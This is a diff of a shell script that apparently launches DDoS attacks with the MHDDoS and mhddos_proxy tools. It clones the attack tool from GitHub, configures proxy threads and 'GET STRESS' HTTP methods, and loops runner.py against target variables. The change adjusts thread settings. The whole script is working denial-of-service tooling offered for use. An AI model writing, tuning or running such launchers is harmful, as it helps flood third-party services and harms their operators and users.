@@ -33,9 +33,9 @@ if [[ $docker_mode != "true" ]]; then
     proxy_finder="on"
 fi
 
-if [[ $t_set_manual != "on" ]]; then
-    export threads="-t 500"
-fi
+# if [[ $t_set_manual != "on" ]]; then
+#     export threads="-t 500"
+# fi
 export proxy_threads="2500"
 export methods="--http-methods GET STRESS"
 #rpc="--rpc 2000"
@@ -199,9 +199,9 @@ git clone https://github.com/MHProDev/MHDDoS.git
 while true; do
 echo "threads: "$threads; echo "methods: "$methods
         pkill -f start.py; pkill -f runner.py 
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $methods&
         sleep 10 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
